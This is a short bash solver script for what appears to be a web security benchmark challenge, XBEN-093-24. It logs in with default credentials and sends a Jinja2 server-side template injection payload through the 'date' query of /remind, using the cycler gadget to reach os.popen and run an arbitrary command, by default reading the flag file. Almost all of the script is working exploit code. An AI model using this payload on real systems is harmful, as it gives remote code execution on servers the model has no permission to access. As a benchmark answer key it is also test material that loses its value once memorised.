#!/usr/bin/env bash
# XBEN-093-24 — Jinja2 SSTI in a reminder date. Proxy-mode twin. Log in, then
# /remind renders the `date` query as a template; the cycler gadget reaches
# os.popen to run the command (default: cat flag.txt).
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
COMMAND="${2:-cat flag.txt}"
SESSION="xben093p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/login"; BASE="$(req_of GET /)"; [ -n "$BASE" ] || BASE="$(req_of GET login)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/login' --set 'form.username=user' --set 'form.password=user' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/remind' \
  --set "query.date={{ cycler.__init__.__globals__.os.popen(\"$COMMAND\").read() }}" >/dev/null
print_flag
